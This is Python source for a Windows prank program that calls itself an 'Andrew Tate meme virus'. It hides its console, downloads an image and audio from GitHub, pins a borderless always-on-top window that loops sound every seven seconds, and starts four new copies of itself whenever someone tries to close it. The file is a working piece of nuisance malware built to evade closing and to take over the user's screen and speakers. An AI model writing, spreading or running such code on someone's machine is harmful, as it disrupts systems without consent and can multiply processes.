import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
import subprocess
import os
import threading
import time
import sys
import winsound
import ctypes
import keyboard  # We'll install this for F10 hotkey

# Your links
IMAGE_URL = "https://raw.githubusercontent.com/KonstanceSRC/andrewtatevirus/main/tate.png"
AUDIO_URL = "https://raw.githubusercontent.com/KonstanceSRC/andrewtatevirus/main/tate.wav"

def download_file(url):
    response = requests.get(url)
    response.raise_for_status()
    return BytesIO(response.content)

def hide_console():
    """Hide the Python console window"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        print("Console hidden. Press F10 to show it again.")
    except:
        pass

def show_console():
    """Show the console when F10 is pressed"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
    except:
        pass

def play_and_loop_audio(audio_data):
    try:
        temp_path = os.path.abspath("tate_audio.wav")
        with open(temp_path, "wb") as f:
            f.write(audio_data.getvalue())
        
        print("🎵 Audio looping every 7 seconds...")
        
        while True:
            winsound.PlaySound(temp_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
            time.sleep(7)
    except Exception as e:
        print("Audio error:", e)

def spawn_new_instance():
    try:
        subprocess.Popen([sys.executable, sys.argv[0]], 
                        creationflags=subprocess.CREATE_NEW_CONSOLE)
    except:
        pass

def on_close():
    for _ in range(4):
        spawn_new_instance()
    return

def main():
    # Hide console immediately
    hide_console()
    
    print("Downloading Andrew Tate meme assets...")
    
    img_data = download_file(IMAGE_URL)
    audio_data = download_file(AUDIO_URL)
    
    root = tk.Tk()
    root.title(" ") 
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", on_close)
    
    # Load image
    image = Image.open(img_data)
    image = image.resize((340, 440), Image.Resampling.LANCZOS)
    photo = ImageTk.PhotoImage(image)
    
    label = tk.Label(root, image=photo, bd=0)
    label.pack()
    
    # Bottom left
    screen_h = root.winfo_screenheight()
    win_w = image.width
    win_h = image.height
    x = 30
    y = screen_h - win_h - 60
    root.geometry(f"{win_w}x{win_h}+{x}+{y}")
    
    # Start audio
    threading.Thread(target=play_and_loop_audio, args=(audio_data,), daemon=True).start()
    
    print("🚨 ANDREW TATE MEME VIRUS ACTIVE 🔥")
    print("   → Console is hidden")
    print("   → Press F10 to show console (then you can close it)")
    print("   → Trying to close image spawns more!")
    
    # Setup F10 hotkey
    keyboard.add_hotkey('f10', show_console)
    
    root.mainloop()

if __name__ == "__main__":
    main()